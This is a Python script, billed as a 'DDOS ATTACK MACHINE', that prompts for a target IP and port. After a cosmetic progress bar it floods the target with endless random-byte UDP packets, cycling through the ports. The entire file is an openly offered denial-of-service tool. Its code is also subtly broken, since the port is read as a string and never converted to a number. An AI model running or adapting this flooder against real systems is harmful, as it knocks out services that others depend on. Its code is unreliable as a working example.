#!/usr/bin/env python3 
# John Melody Me
import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("cls")
#os.system("pip install figlet")
#os.system("figlet DDos Attack")
os.system("echo DDOS ATTACK MACHINE")
print()
print("Author   : JOHNMELODYME")
print("Github   : https://github.com/johnmelodyme")
print()
ip = input("IP Target : ")
port = input("Port       : ")

os.system("cls")
os.system("echo Attack Starting")
os.system("cls")
os.system("echo Attack Starting")
print("[                    ] 0% ")
time.sleep(5)
os.system("cls")
os.system("echo Attack Starting")
print("[=====               ] 25%")
time.sleep(5)
os.system("cls")
os.system("echo Attack Starting")
print("[==========          ] 50%")
time.sleep(5)
os.system("cls")
os.system("echo Attack Starting")
print("[===============     ] 75%")
time.sleep(5)
os.system("cls")
os.system("echo Attack Starting")
print("[====================] 100%")
time.sleep(3)
os.system("cls")
sent = 0
while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    port = port + 1
    print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
    if port == 65534:
      port = 1
